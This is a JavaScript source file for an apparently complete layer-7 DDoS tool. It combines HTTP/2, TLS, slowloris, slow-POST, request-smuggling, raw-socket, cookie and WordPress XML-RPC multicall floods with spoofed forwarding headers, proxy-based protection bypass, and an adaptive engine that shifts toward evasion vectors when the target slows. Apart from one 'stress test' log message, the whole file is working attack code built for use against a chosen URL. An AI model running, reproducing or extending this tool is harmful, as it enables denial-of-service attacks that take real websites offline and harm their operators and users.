const axios = require('axios');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');
const zlib = require('zlib');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const dns = require('dns');
const { performance } = require('perf_hooks');
const events = require('events');
const chalk = require('chalk');
const { v4: uuidv4 } = require('uuid');
const readline = require('readline');
const DurationManager = require('../module/duration');
const AttackManager = require('../module/attackManager');
const optimizer = require('../module/optimalization');
const { Bypasser } = require('./Bypass');
const fs = require('fs');

events.EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

class AIAttackDefenseEngine {
    constructor() {
        this.state = 'RECON';
        this.threatLevel = 0;
        this.learningRate = 0.1;
        this.vectorWeights = {
            h2: 1.0,
            tls: 1.0,
            socket: 1.0,
            http1: 1.0,
            smuggle: 1.0,
            slow: 1.0,
            cookie: 1.0,
            xmlrpc: 1.0
        };
        this.history = [];
    }

    analyze(stats, latency) {
        const successRate = (stats.success || 0) / (stats.requestsSent || 1);
        this.history.push({ latency, successRate, timestamp: Date.now() });
        if (latency > 3000 || successRate < 0.2) {
            this.state = 'BYPASS_EVASION';
            this.threatLevel = 9;
        } else if (latency > 1000) {
            this.state = 'ADAPTIVE_AGGRESSION';
            this.threatLevel = 5;
        } else {
            this.state = 'MAX_THROUGHPUT';
            this.threatLevel = 2;
        }
        this.adjustWeights(stats);
    }

    adjustWeights(stats) {
        const vectors = stats.vectors;
        const total = Object.values(vectors).reduce((a, b) => a + b, 0) || 1;
        
        for (const v in this.vectorWeights) {
            const effectiveness = (vectors[v] || 0) / total;
            if (this.state === 'BYPASS_EVASION') {
                this.vectorWeights[v] = (v === 'h2' || v === 'smuggle' || v === 'tls') ? 2.5 : 0.2;
            } else if (this.state === 'ADAPTIVE_AGGRESSION') {
                this.vectorWeights[v] = effectiveness > 0.1 ? 1.8 : 0.8;
            } else {
                this.vectorWeights[v] = 1.0;
            }
        }
        if (this.history.length > 50) this.history.shift();
    }

    getStrategy() {
        return {
            state: this.state,
            weights: this.vectorWeights,
            concurrencyMultiplier: this.threatLevel > 5 ? 2 : 1
        };
    }
}

class DDoSL7 {
    constructor(targetUrl, durationStr, io) {
        this.url = new URL(targetUrl);
        this.target = targetUrl;
        this.duration = DurationManager.parseToMs(durationStr);
        this.io = io;
        this.isRunning = false;
        this.startTime = null;
        // Batasi jumlah Worker nyata (OS level) agar tidak mencekik CPU
        this.maxWorkers = Math.min(os.cpus().length * 2, 4); 
        this.safeModeActive = false;
        this.safeModeCooldown = 0;
        this.workers = [];
        this.bypasser = new Bypasser(this.io);
        this.bypasser.loadProxiesFromFile('proxies.txt');
        this.ai = new AIAttackDefenseEngine();
        this.resolvedIP = null;
        this.pool = Buffer.allocUnsafe(2 * 1024 * 1024);
        crypto.randomFillSync(this.pool);
        
        this.stats = {
            requestsSent: 0,
            success: 0,
            failed: 0,
            bytesSent: 0,
            activeConnections: 0,
            vectors: {
                h2: 0,
                tls: 0,
                socket: 0,
                http1: 0,
                smuggle: 0,
                slow: 0,
                cookie: 0,
                xmlrpc: 0
            }
        };

        this.agents = {
            http: new http.Agent({ 
                keepAlive: true, 
                maxSockets: 10000, 
                maxFreeSockets: 1000,
                timeout: 3000 
            }),
            https: new https.Agent({ 
                keepAlive: true, 
                maxSockets: 10000, 
                maxFreeSockets: 1000,
                timeout: 3000 
            })
        };

        this.payloads = [
            () => this.pool.slice(0, 128).toString('hex'),
            () => JSON.stringify({id: uuidv4(), ts: Date.now(), data: this.pool.slice(0, 256).toString('base64')}),
            () => Array.from({length: 15}, () => `${this.puid()}=${this.puid()}`).join('&'),
            () => `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><audit>${this.puid()}</audit></soapenv:Body></soapenv:Envelope>`
        ];

        this.ciphers = [
            'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES128-GCM-SHA256'
        ];

        this.sigalgs = [
            'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256'
        ];
    }

    async init() {
        return new Promise((res) => {
            dns.lookup(this.url.hostname, (err, addr) => {
                if (!err) this.resolvedIP = addr;
                else this.resolvedIP = this.url.hostname;
                res();
            });
        });
    }

    puid() {
        return crypto.randomBytes(8).toString('hex');
    }

    genHeaders(method = 'GET') {
        const cfg = this.bypasser.generateBypassConfig(this.target);
        return {
            ...cfg.headers,
            'X-Forwarded-For': Array.from({length: 4}, () => crypto.randomInt(1, 255)).join('.'),
            'X-Real-IP': Array.from({length: 4}, () => crypto.randomInt(1, 255)).join('.'),
            'X-Correlation-ID': crypto.randomUUID(),
            'TE': 'trailers',
            'Max-Forwards': '10'
        };
    }

    async start() {
        await this.init();
        if (cluster.isMaster) {
            os.cpus().forEach(() => {
                const fork = cluster.fork();
                this.workers.push(fork);
            });
            cluster.on('exit', (worker, code, signal) => {
                if (this.isRunning) {
                    cluster.fork();
                }
            });
        }
        this.isRunning = true;
        this.startTime = Date.now();
        this.emitLog(`[CORE] Attack Engine Started`, 'success');
        if (isMainThread) {
            for (let i = 0; i < this.maxWorkers; i++) {
                const worker = new Worker(__filename, {
                    workerData: {
                        target: this.target,
                        duration: this.duration,
                        startTime: this.startTime,
                        ip: this.resolvedIP
                    }
                });
                worker.on('message', (msg) => this.handleWorkerStats(msg));
                this.workers.push(worker);
            }
        }
        this.floodOrchestrator();
        this.healthMonitor();
        this.startAutoScaling();
    }

    startAutoScaling() {
        const scaleInterval = setInterval(() => {
            if (!this.isRunning) return clearInterval(scaleInterval);

            const idealThreads = optimizer.getAdaptiveConcurrency(1000);
            const currentThreads = this.workers.length;

            if (idealThreads > currentThreads) {
                const diff = idealThreads - currentThreads;
                this.emitLog(`[SCALING] Scaling UP: Adding ${diff} threads.`, 'warn');
                for (let i = 0; i < diff; i++) {
                    const worker = new Worker(__filename, {
                        workerData: {
                            target: this.target,
                            duration: this.duration,
                            startTime: this.startTime,
                            ip: this.resolvedIP
                        }
                    });
                    worker.on('message', (msg) => this.handleWorkerStats(msg));
                    this.workers.push(worker);
                }
            } else if (idealThreads < currentThreads) {
                const diff = currentThreads - idealThreads;
                this.emitLog(`[SCALING] Scaling DOWN: Terminating ${diff} threads due to high load.`, 'warn');
                for (let i = 0; i < diff; i++) {
                    const worker = this.workers.pop();
                    if (worker) {
                        worker.terminate();
                    }
                }
            }
            
            if (this.io) this.io.emit('log', { msg: `[ENGINE] Current Concurrency: ${this.workers.length} threads`, type: 'info' });
        }, 15000);
    }

    handleWorkerStats(msg) {
        if (msg.type === 'stats') {
            this.stats.requestsSent += msg.data.requestsSent;
            this.stats.success += msg.data.success;
            this.stats.failed += msg.data.failed;
            this.stats.bytesSent += msg.data.bytes || 0;
            Object.keys(msg.data.vectors).forEach(k => this.stats.vectors[k] += msg.data.vectors[k]);
            if (this.stats.requestsSent % 5000 === 0) {
                this.emitStats();
                AttackManager.updateStats(this.target, { ...this.stats });
            }
        }
    }

    emitStats() {
        const progress = DurationManager.getProgress(this.startTime, this.duration);
        if (this.io) {
            this.io.emit('attack_progress', { 
                    ...this.stats, 
                    progress, 
                    throughput: (this.stats.bytesSent / 1024 / 1024).toFixed(2) + ' MB',
                    aiState: this.ai.state 
                });
        }
    }

    healthMonitor() {
        const monitorInterval = setInterval(async () => {
            if (!this.isRunning) {
                clearInterval(monitorInterval);
                return;
            }
            try {
                const start = performance.now();
                const res = await axios.get(this.target, { 
                    timeout: 5000, 
                    validateStatus: false,
                    headers: { 'Cache-Control': 'no-cache' },
                    httpAgent: this.agents.http,
                    httpsAgent: this.agents.https
                });
                const end = performance.now();
                const latency = end - start;
                this.ai.analyze(this.stats, latency);

                // Aktifkan Safe Mode jika optimizer dalam kondisi kritis
                if (optimizer.isCritical && !this.safeModeActive) {
                    this.activateSafeMode();
                }
                
                if (this.io) {
                    this.io.emit('target_movement', {
                        status: res.status,
                        latency: latency.toFixed(2),
                        timestamp: new Date().toLocaleTimeString(),
                        url: this.target
                    });
                }
                this.emitLog(`[AI:${this.ai.state}] HTTP ${res.status} | RTT: ${latency.toFixed(2)}ms`, 'success');
            } catch (err) {
                if (this.io) this.io.emit('target_down', { url: this.target, error: err.message });
            }
        }, 5000);
    }

    floodOrchestrator() {
        const runNext = () => {
            if (!this.isRunning) return;
            if (DurationManager.isExpired(this.startTime, this.duration)) {
                this.stop();
                return;
            }
            this.executeVectors();
            // Gunakan setTimeout agar Event Loop bisa memproses monitoring di sela-sela serangan
            setTimeout(runNext, this.safeModeActive ? 500 : 150);
        };
        runNext();
    }

    activateSafeMode() {
        this.safeModeActive = true;
        this.emitLog(`[SAFE MODE] Activated: Reducing attack intensity.`, 'warn');
        // Implementasi pengurangan intensitas serangan di sini
        // Misalnya, mengurangi jumlah iterasi di executeVectors
        // Atau hanya menjalankan vektor serangan tertentu
    }

    executeVectors() {
        const strategy = this.ai.getStrategy();
        let iterations = 10 * strategy.concurrencyMultiplier;

        if (this.safeModeActive) {
            iterations = Math.max(1, Math.floor(iterations * 0.1)); // Kurangi iterasi hingga 10%
        }

        for (let i = 0; i < iterations; i++) {
            if (Math.random() < strategy.weights.h2) this.h2Flood();
            if (Math.random() < strategy.weights.tls) this.tlsFlood();
            if (Math.random() < strategy.weights.http1) this.postFlood();
            if (Math.random() < strategy.weights.http1) this.headFlood();
            this.optionsFlood();
            this.putFlood();
            this.patchFlood();
            this.headerSmuggleFlood();
            this.slowlorisVector();
            this.slowPostVector();
            this.rawSocketFlood();
            this.compressionFlood();
            this.cookieFlood();
            this.xmlRpcFlood();
            this.junkFlood();
        }
    }

    headerSmuggleFlood() {
        const headers = this.genHeaders('POST');
        const payload = `POST ${this.url.pathname} HTTP/1.1\r\n` +
                        `Host: ${this.url.hostname}\r\n` +
                        `Content-Length: 4\r\n` +
                        `Transfer-Encoding: chunked\r\n\r\n` +
                        `0\r\n\r\nGET /?${this.puid()} HTTP/1.1\r\nHost: ${this.url.hostname}\r\n\r\n`;
        const socket = net.connect(this.url.port || 80, this.resolvedIP, () => {
            socket.write(payload);
            this.stats.requestsSent++;
            this.stats.vectors.smuggle++;
            socket.destroy();
        });
        socket.on('error', () => { this.stats.failed++; socket.destroy(); });
    }

    slowlorisVector() {
        const socket = net.connect(this.url.port || 80, this.resolvedIP, () => {
            socket.write(`GET /?${this.puid()} HTTP/1.1\r\nHost: ${this.url.hostname}\r\n`);
            const keepAlive = setInterval(() => {
                if (!this.isRunning || socket.destroyed) return clearInterval(keepAlive);
                socket.write(`X-Audit-${this.puid()}: ${this.puid()}\r\n`);
            }, 2000);
            this.stats.activeConnections++;
        });
        socket.on('error', () => { socket.destroy(); this.stats.activeConnections--; });
        setTimeout(() => socket.destroy(), 30000);
    }

    rawSocketFlood() {
        const socket = net.connect(this.url.port || 80, this.resolvedIP, () => {
            for(let i=0; i<50; i++) {
                socket.write(this.pool.slice(crypto.randomInt(0, 32768), crypto.randomInt(32769, 65535)));
                this.stats.requestsSent++;
                this.stats.vectors.socket++;
            }
            socket.destroy();
        });
        socket.on('error', () => socket.destroy());
    }

    postFlood() {
        const headers = this.genHeaders('POST');
        const body = this.payloads[Math.floor(Math.random() * this.payloads.length)]();
        axios.post(this.target + '?' + this.puid(), body, {
            timeout: 2000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: {
                ...headers,
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
        }).then(() => { this.stats.success++; this.stats.vectors.http1++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    headFlood() {
        const headers = this.genHeaders('HEAD');
        axios.head(this.target + '?' + this.puid(), {
            timeout: 2000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: headers
        }).then(() => { this.stats.success++; this.stats.vectors.http1++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    optionsFlood() {
        const headers = this.genHeaders('OPTIONS');
        axios.options(this.target + '?' + this.puid(), {
            timeout: 2000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: headers
        }).then(() => { this.stats.success++; this.stats.vectors.http1++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    putFlood() {
        const headers = this.genHeaders('PUT');
        const body = this.payloads[crypto.randomInt(0, this.payloads.length)]();
        axios.put(this.target + '?' + this.puid(), body, {
            timeout: 2000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: { ...headers, 'Content-Type': 'application/json' }
        }).then(() => { this.stats.success++; this.stats.vectors.http1++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    patchFlood() {
        const headers = this.genHeaders('PATCH');
        const body = this.payloads[crypto.randomInt(0, this.payloads.length)]();
        axios.patch(this.target + '?' + this.puid(), body, {
            timeout: 2000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: { ...headers, 'Content-Type': 'application/json' }
        }).then(() => { this.stats.success++; this.stats.vectors.http1++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    slowPostVector() {
        const socket = net.connect(this.url.port || 80, this.resolvedIP, () => {
            const body = this.puid().repeat(10);
            socket.write(`POST /?${this.puid()} HTTP/1.1\r\n` +
                         `Host: ${this.url.hostname}\r\n` +
                         `Content-Length: ${body.length * 1000}\r\n` +
                         `Connection: keep-alive\r\n\r\n`);
            let sent = 0;
            const interval = setInterval(() => {
                if (!this.isRunning || socket.destroyed || sent >= 1000) return clearInterval(interval);
                socket.write(body[sent % body.length]);
                sent++;
            }, 500);
            this.stats.activeConnections++;
            this.stats.vectors.slow++;
        });
        socket.on('error', () => { socket.destroy(); this.stats.activeConnections--; });
        setTimeout(() => socket.destroy(), 60000);
    }

    cookieFlood() {
        const headers = this.genHeaders();
        const manyCookies = Array.from({length: 50}, () => `${this.puid()}=${this.puid()}`).join('; ');
        axios.get(this.target + '?' + this.puid(), {
            timeout: 2000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: { ...headers, 'Cookie': manyCookies }
        }).then(() => { this.stats.success++; this.stats.vectors.cookie++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    xmlRpcFlood() {
        const headers = this.genHeaders('POST');
        const payload = `<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>${Array.from({length: 20}, () => `<value><struct><member><name>methodName</name><value>pingBack.ping</value></member></struct></value>`).join('')}</data></array></value></param></params></methodCall>`;
        axios.post(this.target, payload, {
            timeout: 3000,
            validateStatus: false,
            httpAgent: this.agents.http,
            httpsAgent: this.agents.https,
            headers: { ...headers, 'Content-Type': 'text/xml' }
        }).then(() => { this.stats.success++; this.stats.vectors.xmlrpc++; })
          .catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    junkFlood() {
        const socket = net.connect(this.url.port || 80, this.resolvedIP, () => {
            socket.write(crypto.randomBytes(2048));
            this.stats.requestsSent++;
            this.stats.vectors.socket++;
            socket.destroy();
        });
        socket.on('error', () => socket.destroy());
    }

    compressionFlood() {
        const headers = this.genHeaders();
        axios.get(this.target, {
            timeout: 2000,
            validateStatus: false,
            headers: {
                ...headers,
                'Accept-Encoding': 'gzip, deflate, br, identity'
            },
            responseType: 'stream'
        }).then(res => {
            res.data.on('data', () => {});
            this.stats.success++;
        }).catch(() => this.stats.failed++);
        this.stats.requestsSent++;
    }

    h2Flood() {
        try {
            const client = http2.connect(this.url.origin, {
                settings: { 
                    enablePush: false, 
                    initialWindowSize: 1073741823,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 1000,
                    maxHeaderListSize: 1073741823
                }
            });
            client.on('error', (err) => client.destroy());
            for (let i = 0; i < 100; i++) {
                if (client.destroyed) break;
                const headers = this.genHeaders();
                const req = client.request({
                    ':method': 'GET',
                    ':path': this.url.pathname + '?' + this.puid() + '=' + this.puid(),
                    ...headers,
                    'te': 'trailers'
                });
                req.on('response', () => {
                    this.stats.success++;
                    this.stats.vectors.h2++;
                    req.close();
                });
                req.on('error', () => {
                    this.stats.failed++;
                    req.close();
                });
                req.end();
                this.stats.requestsSent++;
            }
            setTimeout(() => { if(!client.destroyed) client.destroy(); }, 2000);
        } catch (err) {
            this.stats.failed++;
        }
    }

    tlsFlood() {
        try {
            const options = {
                host: this.url.hostname,
                port: this.url.port || 443,
                rejectUnauthorized: false,
                servername: this.url.hostname,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ciphers: this.ciphers.join(':'),
                sigalgs: this.sigalgs.join(':'),
                honorCipherOrder: true
            };
            const socket = tls.connect(options, () => {
                for (let i = 0; i < 50; i++) {
                    const headers = this.genHeaders();
                    const raw = `GET ${this.url.pathname}?${this.puid()} HTTP/1.1\r\n` +
                                `Host: ${this.url.hostname}\r\n` +
                                `Connection: keep-alive\r\n` +
                                Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\r\n') + 
                                '\r\n\r\n';
                    socket.write(raw);
                    this.stats.requestsSent++;
                    this.stats.vectors.tls++;
                    this.stats.bytesSent += raw.length;
                }
                setTimeout(() => socket.destroy(), 1000);
            });
            socket.on('error', (err) => socket.destroy());
            socket.setTimeout(3000, () => socket.destroy());
        } catch (e) {
            this.stats.failed++;
        }
    }

    async recursiveFlood() {
        if (!this.isRunning) return;
        const burst = [];
        for (let i = 0; i < 10; i++) {
            burst.push(this.sendRequest());
        }
        await Promise.allSettled(burst);
        setImmediate(() => this.recursiveFlood());
    }

    async sendRequest() {
        const headers = this.genHeaders();
        const url = this.target + '?' + this.puid() + '=' + this.puid();
        this.stats.requestsSent++;
        try {
            const res = await axios.get(url, {
                timeout: 2000,
                validateStatus: false,
                httpAgent: this.agents.http,
                httpsAgent: this.agents.https,
                headers: headers,
                responseType: 'arraybuffer'
            });
            this.stats.success++;
            this.stats.bytesSent += res.data.length;
            this.stats.vectors.http1++;
        } catch (e) {
            this.stats.failed++;
        }
    }

    emitLog(msg, type) {
        const timestamp = new Date().toLocaleTimeString();
        const formattedMsg = `[${timestamp}] ${msg}`;
        const color = type === 'error' ? chalk.red : (type === 'success' ? chalk.green : chalk.yellow);
        
        if (this.io) this.io.emit('log', { msg: formattedMsg, type });
        console.log(color(formattedMsg));
    }

    stop() {
        this.isRunning = false;
        this.workers.forEach(w => w.terminate());
        AttackManager.remove(this.target);
        this.emitLog(`[END] Stress Test Terminated. Total Packets: ${this.stats.requestsSent}`, 'success');
        if (this.io) this.io.emit('attack_complete', this.stats);
    }
}

if (!isMainThread) {
    const { duration, startTime } = workerData;
    const createStats = () => ({
        requestsSent: 0, success: 0, failed: 0, bytes: 0,
        vectors: { h2: 0, tls: 0, socket: 0, http1: 0, smuggle: 0, slow: 0, cookie: 0, xmlrpc: 0 }
    });
    let localStats = createStats();

    setInterval(() => {
        if (Date.now() - startTime > duration) process.exit(0);
        if (localStats.requestsSent > 0) {
            parentPort.postMessage({ type: 'stats', data: localStats });
            localStats = createStats();
        }
    }, 1000);
}

module.exports = { DDoSL7 };